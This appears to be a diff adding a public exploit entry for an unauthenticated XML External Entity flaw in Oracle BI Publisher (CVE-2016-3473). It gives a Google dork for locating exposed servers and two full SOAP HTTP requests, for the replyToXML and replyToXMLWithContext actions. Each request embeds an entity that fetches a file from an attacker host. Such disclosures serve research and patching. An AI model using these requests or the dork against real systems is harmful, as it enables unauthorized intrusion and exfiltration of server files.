@@ -1,0 +1,57 @@
+# Exploit Title: Oracle BI Publisher (formerly XML Publisher) - XML External Entity Injection w/o authentication
+# Date: 20\10\2016
+# Exploit Author: Jakub Palaczynski
+# CVE : CVE-2016-3473
+# Vendor Homepage: https://www.oracle.com/
+# Version: 11.1.1.6.0, 11.1.1.7.0, 11.1.1.9.0, 12.2.1.0.0
+# Info: Previous versions may also be vulnerable.
+# Google Dork: inurl:xmlpserver or intitle:"Oracle BI Publisher Enterprise Login"
+
+1. Vulnerable SOAP Action: replyToXML
+
+POST /xmlpserver/services/ServiceGateway HTTP/1.1
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: #replyToXML
+Host: vulnerablehost
+Content-Length: 630
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://xmlns.oracle.com/oxp/service/service_gateway">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ser:replyToXML soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+         <incomingXML xsi:type="xsd:string"><![CDATA[<?xml version="1.0" encoding="utf-8"?><!DOCTYPE m [ <!ENTITY % remote SYSTEM "http://attacker/file.xml">%remote;]>]]></incomingXML>
+      </ser:replyToXML>
+   </soapenv:Body>
+</soapenv:Envelope>
+
+------------------------------------------------
+
+2. Vulnerable SOAP Action: replyToXMLWithContext
+
+POST /xmlpserver/services/ServiceGateway HTTP/1.1
+
+Content-Type: text/xml;charset=UTF-8
+
+SOAPAction: #replyToXMLWithContext
+
+Host: vulnerablehost
+
+Content-Length: 646
+
+
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://xmlns.oracle.com/oxp/service/service_gateway">
+
+   <soapenv:Header/>
+
+   <soapenv:Body>
+
+      <ser:replyToXMLWithContext soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+
+         <incomingXML xsi:type="xsd:string"><![CDATA[<?xml version="1.0" encoding="utf-8"?><!DOCTYPE m [ <!ENTITY % remote SYSTEM "http://attacker/file.xml">%remote;]>]]></incomingXML>
+
+      </ser:replyToXMLWithContext>
+
+   </soapenv:Body>
+
+</soapenv:Envelope>
